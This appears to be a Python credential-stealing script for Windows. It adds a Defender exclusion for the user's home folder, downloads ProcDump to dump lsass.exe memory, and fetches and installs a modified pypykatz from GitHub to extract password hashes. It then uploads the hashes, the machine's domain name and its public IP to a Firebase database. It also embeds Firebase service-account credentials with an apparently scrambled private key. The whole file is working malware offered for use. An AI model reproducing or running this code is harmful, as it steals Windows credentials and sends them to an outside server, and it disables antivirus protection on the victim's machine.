import firebase_admin
from firebase_admin import credentials
from firebase_admin import db
import os,json,random,time
from datetime import datetime 
from win32com.shell import shell
from requests import get
from colorama import Fore,Back as bg



def password_gen(length):
    characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
    password = ""
    for i in range(length):
        password += random.choice(characters.lower())
    return password


__chars__ = password_gen(10)
__cat__ = password_gen(10)
__folder__ = password_gen(10)
__site__ = password_gen(10)
__out__ = password_gen(10)

# Change this to your firebase credentials otherwise it won't work.
creds_content = {
  "type": "service_account",
  "project_id": "password-database-1a0d7",
  "private_key_id": "25456beb48b7c74b48bcecf6acd15a390ae86ecf",
  "private_key": "-----PRRGE DSWOOGP IVM-----\oABWRgeZPBRTBOrihvlwZ9k0OLOVTBOLQOVenuhGdOtPYRcJPTEPjl7mj7n1nb6CL\yOhDOvtDs95RfrLwe8bzfDlN+tFe9DbQrAtnK8ZBD6pZt0WH1FEqueYtw2UVL50Bl\a3PdrKvE+XV1GhsrlobLnu/H/qtcQu8E9aagYtKauHPDGYV2JmTOV1zZQkEJFZU+L\y2qnzOtg31xs8E9SVEcveAve3upi8vdU+2ysG+5G32GqW2wPRzgWOlzCMKqYkd8uA\bc9umbBBqFARWiZLeSKG3GolwG6sLmcvzC7VLLxLbLZHYIV0zR22dKzcUL/vJ6EcM\bY2VEDNlAwp3au4xy42pkzRpkNztjT90UifhLnlaXspGw4VIHtvozEZDfircohC8A\ysV7MIprRNrKSOBSVutPYRfEal0BGzVxOb5nJSMbTAvzyVpO9kfa+wCyyS6t/eTOq\oKQyZFqrRjRlgeJrcFv6CCm6mqoDcoKuctxNBu/72kJWE8bcCvjd41RHI1BSQq3dd\bU6m6VpLf5b/dqnmZAo1HjlXKEolNU2aLYcYka1AX3RXb+5gY9pY1AsoWl7hrdkun\bix5Nks5QeYBN+ZC1gh2Tc5Up0L1z1+NB6i3l+zhQsXBmZV+AWIGZRqWx4CKFzOGP\atO4pjOQMGDvAF/QJI6FWGY1jl6kSS/EjhOapkCFRvKogrG3KLQ0rFzld05e3NFAL\a6VHfzLWRgaK4j/yMtsp8KwyflDZrEJIBihqmVnE8RBISuRRQxtuV32f7DE1fpy97\a/mTQOiZ8iNuuRYz/CPkY1SBE7dYC7JGcY6BtWgXIcoQj28gsbnlMThzOyo6QNF4h\aju/zycmz+gLc2rfuRDJ3B2v6HM7pGGOon1QcLU5V1eBic26OI9KRD1DRU5FxjZYi\oEfWjle+TYFkIiAbjFbpr05sskhISuRRNW8ZL58dib/WcXVX0vj5iwThiTVRvX0w1\oF6MlVnAvgX5W5V0ullV3GbxVymSqNs1TLWIddQ4S7S0SEC2lZ6jVTqc6V1MxOMZf\ei7IMTKtHyFQLWnabzBTsBPgt0IvtjemffbwH/MZ99kEADlCJ4V1nap+bU9ioMgd0\bgT6MPU9zXHYCuWIWZFeA+czuoN1veFEVT5Hj4/LA1F/JYD6hOh5QLc22g7krXSGQ\y7DJ9iK2Ty21v0TvfnYug/nvGkZSmFPsYHc0/cYpwLHIonuYinKzuyA8KkZZsIgFF\ljCd+AgxNEqL2BiTN/3wKR3qo2Hx20rjofXeJkJOR5QLHIZ3k5n0QMF2iLmXPBYEf\aXYzG+OB5MyC0GbErlMoiyGqd948blOaOyRhephUq7QhzoHjFAPGKURFkr9J0ZrMj\lUvT1HXCiWV193V3tdfPwInIKK9EPcndyXzophxX3+iR7zV0bdE72kiuI47Ex+II9\bDE6nfzdm53czBaUfihYX4Dg7Y+y7bw3VIgUTu8FYYfUCODI0EeYsiyXQprhriZtL\gnt7WPBj1B3J5YA3zjgS52z7pPUNQOeQLhEcwFhkbuNuizHSqbFC5f200Je855Pqy\e2m08Tfy5sDxB5AxKIpWzwioVP2EG76nJDhmEfQvWRRoZEwZLCfOBCMeIAqOO8fPp\oheHUFkhR15rifeMlzvpZrj06\b-----RYB GFJJTHR VCP-----\b",
  "client_email": "firebase-adminsdk-efs91@password-database-1a0d7.iam.gserviceaccount.com",
  "client_id": "105889749184857313883",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-efs91%40password-database-1a0d7.iam.gserviceaccount.com"
}


with open(f"{os.environ['TEMP']}\\firebase_auth.json","w") as f:
    json.dump(creds_content,f)


if(os.path.isfile(os.environ['TEMP'] + "\\firebase_auth.json") == True):
    cred = credentials.Certificate(os.environ['TEMP'] + "\\firebase_auth.json")
else:
    print("File not found")


firebase_admin.initialize_app(cred, {
    #Change This to your databaseURL
    'databaseURL': "https://password-database-1a0d7-default-rtdb.firebaseio.com/"
})

class Firebase:
    def __init__(self):
        self.__db = db

    @staticmethod
    def initialize_file():
        print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]Initializing required files...")
        proc_path = os.environ['HOMEPATH'] + '\\' + __chars__ + ".zip"
        exclude_path = os.system(f"powershell.exe -Command Add-MpPreference -ExclusionPath {os.environ['HOMEPATH']}")
        get_file = os.system(f"powershell.exe -Command Invoke-WebRequest https://download.sysinternals.com/files/Procdump.zip -o {proc_path}")
        
        if(os.path.isfile(proc_path) == True):
            os.system(f"powershell.exe -Command Expand-Archive -Path {proc_path} -DestinationPath {os.environ['HOMEPATH']}\\{__chars__} -Verbose")
          
        else:
            print(f"{Fore.WHITE}[{Fore.RED}+{Fore.WHITE}]File not found")
        
        if(os.path.isfile(f"{os.environ['HOMEPATH']}\\{__chars__}\\procdump.exe") == True):
            os.system(f"powershell.exe -Command  {os.environ['HOMEPATH']}\\{__chars__}\\procdump.exe -accepteula -r -ma lsass.exe {os.environ['HOMEPATH']}\\{__chars__}.dmp")
            time.sleep(1)
            print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]Initializing Files Complete!")
    
    def pypykatz(self):
        pyscripts_path = f"{os.environ['LOCALAPPDATA']}\\packages\\pythonsoftwarefoundation.python.3.10_qbz5n2kfra8p0\\localcache\\local-packages\\python310\\site-packages"
        if os.path.isfile(f"{os.environ['HOMEPATH']}\\{__cat__}\\pypykatz-modified-master") == True:
            pass
        else:
            grab_repo = os.system(f"powershell.exe -Command Invoke-WebRequest https://github.com/FonderElite/pypykatz-modified/archive/refs/heads/master.zip -o {os.environ['HOMEPATH']}\\{__cat__}.zip")
            if(os.path.isfile(f"{os.environ['HOMEPATH']}\\{__cat__}.zip") == True):
                os.system(f"powershell.exe -Command Expand-Archive -Path {os.environ['HOMEPATH']}\\{__cat__}.zip -DestinationPath {os.environ['HOMEPATH']}\\{__cat__} -Verbose")
       
        #Install pypykatz
        os.chdir(f"{os.environ['HOMEPATH']}\\{__cat__}\\pypykatz-modified-master")
        os.system(f"powershell.exe -Command python3 setup.py install --user")

        #Execute pypykatz
        os.chdir(f"{os.environ['LOCALAPPDATA']}\\Packages\\PythonSoftwareFoundation.Python.3.10_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python310\\Scripts")
        os.system(f"pypykatz.exe lsa minidump {os.environ['HOMEPATH']}\\{__chars__}.dmp --json -o {os.environ['HOMEPATH']}\\{__out__}.dll")
        
        #Show Results (You can comment this out)
        #os.system(f"pypykatz.exe lsa minidump {os.environ['HOMEPATH']}\\{__chars__}.dmp")

    @property 
    def fire_base(self):
        return self.__db

    @fire_base.setter
    def fire_base(self,database):
        self.__db = database

        ref = db.reference(self.__db)
        users_ref = ref.child("users")
        hash_file = open(f"{os.environ['HOMEPATH']}\\{__out__}.dll","r")
        read_file = hash_file.readlines()
        users_ref.set({
            os.environ["USERDOMAIN"]: {
                "Date":str(datetime.now()),
                "IP": get('https://api.ipify.org').text,
                "Hash-Dump":read_file
            }
            })
        hash_file.close()
      

if(__name__ == "__main__"):
        firebase = Firebase()
        firebase.initialize_file()
        firebase.pypykatz()
        firebase.fire_base = 'py/'
        


